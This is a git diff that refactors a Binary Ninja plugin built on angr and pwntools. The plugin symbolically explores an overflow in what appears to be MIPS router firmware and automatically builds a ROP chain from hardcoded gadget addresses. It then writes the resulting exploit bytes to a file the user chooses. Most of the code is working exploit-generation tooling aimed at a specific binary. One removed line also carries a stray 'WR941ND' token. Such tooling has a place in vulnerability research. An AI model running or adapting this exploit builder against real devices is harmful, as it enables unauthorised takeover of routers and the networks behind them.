@@ -8,8 +8,10 @@ from binaryninja.highlight import HighlightColor
 from binaryninja.enums import HighlightStandardColor, MessageBoxButtonSet, MessageBoxIcon
 from binaryninja.plugin import PluginCommand, BackgroundTaskThread, BackgroundTask
 import binaryninja.interaction as interaction
+from binaryninja.interaction import get_save_filename_input, show_message_box
 import binaryninja as binja
 from binaryninja import BinaryView, SectionSemantics
+from abc import ABC, abstractmethod
 import os
 import collections
 from pwn import *
@@ -23,6 +25,47 @@ registers = ['a0', 'a1', 'a2', 'a3', 's0', 's1',
              'sp', 'gp', 'pc', 'ra', 'fp']
 
 
+class Explorer(ABC):
+    @abstractmethod
+    def run(self):
+        pass
+    @abstractmethod
+    def explore(self):
+        pass
+
+class UIPlugin():
+
+    @classmethod
+    def dump_regs(self, state, registers, *include):
+        data = []
+        if(len(include) > 0):
+            data = [x for x in registers if x in include]
+        else:
+            data = registers
+        for reg in data:
+            binja.log_info("${0}: {1}".format(reg, state.regs.get(reg)))
+    
+    @classmethod
+    def color_path(self, bv, addr):
+        # Highlight the instruction in green
+        blocks = bv.get_basic_blocks_at(addr)
+        bv.session_data.find_list.add(addr)
+        for block in blocks:
+            block.set_auto_highlight(HighlightColor(
+                HighlightStandardColor.GreenHighlightColor, alpha=128))
+            block.function.set_auto_instr_highlight(
+                addr, HighlightStandardColor.GreenHighlightColor)
+    
+    @classmethod
+    def clear_color_path(self, bv):
+        for addr in bv.session_data.find_list:
+            blocks = bv.get_basic_blocks_at(addr)
+            for block in blocks:
+                block.set_auto_highlight(HighlightColor(
+                    HighlightStandardColor.NoHighlightColor, alpha=128))
+                block.function.set_auto_instr_highlight(
+                    addr, HighlightStandardColor.NoHighlightColor)
+
 class AngrRunner(BackgroundTaskThread):
     def __init__(self, bv, explorer):
         BackgroundTaskThread.__init__(
@@ -35,14 +78,7 @@ class AngrRunner(BackgroundTaskThread):
 
     @classmethod
     def cancel(self, bv):
-        for addr in bv.session_data.find_list:
-            blocks = bv.get_basic_blocks_at(addr)
-            for block in blocks:
-                block.set_auto_highlight(HighlightColor(
-                    HighlightStandardColor.NoHighlightColor, alpha=128))
-                block.function.set_auto_instr_highlight(
-                    addr, HighlightStandardColor.NoHighlightColor)
-
+        UIPlugin.clear_color_path(bv)
 
 class BackgroundTaskManager():
     def __init__(self, bv):
@@ -61,7 +97,7 @@ class BackgroundTaskManager():
         self.init = init
 
     @classmethod
-    def solve(self, bv):
+    def vuln_explore(self, bv):
         self.init = cyclic(300).encode()
         self.vulnerability_explorer = VulnerabilityExplorer(bv, self.init)
         self.runner = AngrRunner(bv, self.vulnerability_explorer)
@@ -87,38 +123,17 @@ class BackgroundTaskManager():
         self.runner.start()
 
     @classmethod
-    def create_exploit(self,bv):
+    def exploit_to_file(self,bv):
         self.exploit_creator = ExploitCreator(bv, self.init,self.payload)
         self.runner = AngrRunner(bv, self.exploit_creator)
         self.runner.start()
+        
 
     @classmethod
     def stop(self, bv):
         self.runner.cancel(bv)
 
-
-def dump_regs(state, registers, *include):
-    data = []
-    if(len(include) > 0):
-        data = [x for x in registers if x in include]
-    else:
-        data = registers
-    for reg in data:
-        binja.log_info("${0}: {1}".format(reg, state.regs.get(reg)))
-
-
-def find_instr(bv, addr):
-    # Highlight the instruction in green
-    blocks = bv.get_basic_blocks_at(addr)
-    bv.session_data.find_list.add(addr)
-    for block in blocks:
-        block.set_auto_highlight(HighlightColor(
-            HighlightStandardColor.GreenHighlightColor, alpha=128))
-        block.function.set_auto_instr_highlight(
-            addr, HighlightStandardColor.GreenHighlightColor)
-
-
-class VulnerabilityExplorer():
+class VulnerabilityExplorer(Explorer):
     def __init__(self, bv, init_payload):
         self.bv = bv
         self.proj = angr.Project(self.bv.file.filename, ld_path=[
@@ -130,16 +145,16 @@ class VulnerabilityExplorer():
         self.state = self.proj.factory.call_state(0x4703f0, self.arg0)
         self.simgr = self.proj.factory.simgr(self.state)
 
-        self.proj.hook(0x4706fc, self.test)
+        self.proj.hook(0x4706fc, self.explore)
 
-    def test(self, state):
-        find_instr(self.bv, state.solver.eval(state.regs.pc, cast_to=int))
+    def explore(self, state):
+        UIPlugin.color_path(self.bv, state.solver.eval(state.regs.pc, cast_to=int))
         if state.solver.eval(state.regs.pc, cast_to=int) == 0x4706fc:
-            dump_regs(state, registers)
+            UIPlugin.dump_regs(state, registers)
             return True
 
     def run(self):
-        sm = self.simgr.explore(find=self.test)
+        sm = self.simgr.explore(find=self.explore)
         test = sm.found
         if len(test) > 0:
             print(sm.found)
@@ -187,7 +202,7 @@ class VulnerabilityExplorer():
         return contents
         
 
-class ROPExplorer():
+class ROPExplorer(Explorer):
     def __init__(self, bv, init_payload, project, **kwargs):
         self.bv = bv
         self.end_addr = 0x4706fc
@@ -223,7 +238,7 @@ class ROPExplorer():
         self.proj.hook(self.gadget3+12, self.hook_gadget3next12)  # lw $s1, 0x1c($sp)
         self.proj.hook(self.gadget3+16, self.hook_gadget3next16)  # lw $s0, 0x18($sp)
         self.proj.hook(self.gadget4, self.hook_gadget4)  # addiu $s0, $sp, 0x24
-        self.proj.hook(self.gadget5+4, self.build_rop)  # jalr $t9
+        self.proj.hook(self.gadget5+4, self.explore)  # jalr $t9
 
 
     def get_rop_report(self,state, data, gadget):
@@ -248,24 +263,15 @@ class ROPExplorer():
                 state.memory.store(reg+i, state.solver.BVV(data, 32))
                 self.payload[hex(reg+i)] = data.encode()
 
-    def find_instr(self, bv, addr):
-        # Highlight the instruction in green
-        blocks = bv.get_basic_blocks_at(addr)
-        bv.session_data.find_list.add(addr)
-        for block in blocks:
-            block.set_auto_highlight(HighlightColor(
-                HighlightStandardColor.GreenHighlightColor, alpha=128))
-            block.function.set_auto_instr_highlight(
-                addr, HighlightStandardColor.GreenHighlightColor)
 
     def overwrite_ra(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
-        find_instr(self.bv, pc)
+        UIPlugin.color_path(self.bv, pc)
         if pc == self.end_addr:
             self.state_history['init'] = state
 
     def hook_gadget1(self, state):
-        pc = state.solver.eval(state.regs.pc, cast_to=int)WR941ND
+        pc = state.solver.eval(state.regs.pc, cast_to=int)
         if pc == self.gadget1:
             self.state_history[hex(self.gadget1)] = state
 
@@ -344,19 +350,19 @@ class ROPExplorer():
             self.payload[hex(sp+0x24)] = b'SHEL'
             self.state_history[hex(self.gadget4)] = state
 
-    def build_rop(self, state):
+    def explore(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
         if pc == self.gadget5+4:
             return True
 
     def run(self):
-        sm = self.simgr.explore(find=self.build_rop)
+        sm = self.simgr.explore(find=self.explore)
         test = sm.found
         if len(test) > 0:
             print(sm.found)
             found = sm.found[0]
             print("found", found)
-            dump_regs(found, registers)
+            UIPlugin.dump_regs(found, registers)
 
         # Generate raport for gadgets
 
@@ -380,11 +386,14 @@ class ROPExplorer():
             BackgroundTaskManager.set_exploit_payload(self.init, sortedDict)
 
 
-class ExploitCreator():
+class ExploitCreator(Explorer):
     def __init__(self,bv, init, payload):
         self.bv = bv
         self.init = init
         self.payload = payload
+    
+    def explore(self):
+        pass
  
     def generate_exploit(self, payload):
         exploit = self.init
@@ -394,16 +403,21 @@ class ExploitCreator():
 
     def run(self):
         exploit = self.generate_exploit(self.payload)
+        prompt_file = get_save_filename_input('filename')
+        if(not prompt_file):
+            return
         print("exploit", exploit)
-        file_exploit = open('exploit', 'wb')
+        file_exploit = open(prompt_file, 'wb')
         file_exploit.write(exploit)
         file_exploit.close()
-
+        show_message_box("Exploit Creator", "Exploit saved to file",
+                            MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.InformationIcon)
+    
 PluginCommand.register(
-    "Angr\PoC\Solve", "Attempt to solve for a path that satisfies the constraints given", BackgroundTaskManager.solve)
+    "Angr\PoC\Explore", "Attempt to solve for a path that satisfies the constraints given", BackgroundTaskManager.vuln_explore)
 PluginCommand.register("Angr\PoC\Build ROP",
                        "Try to build exploit rop chain", BackgroundTaskManager.build_rop)
-PluginCommand.register("Angr\PoC\Create Exploit",
-                       "Try to build exploit fom rop chain", BackgroundTaskManager.create_exploit)
+PluginCommand.register("Angr\PoC\Generate Exploit\Save to File",
+                       "Try to build exploit fom rop chain", BackgroundTaskManager.exploit_to_file)                      
 PluginCommand.register(
     "Angr\PoC\Clear", "Clear angr path traversed blocks", BackgroundTaskManager.stop)
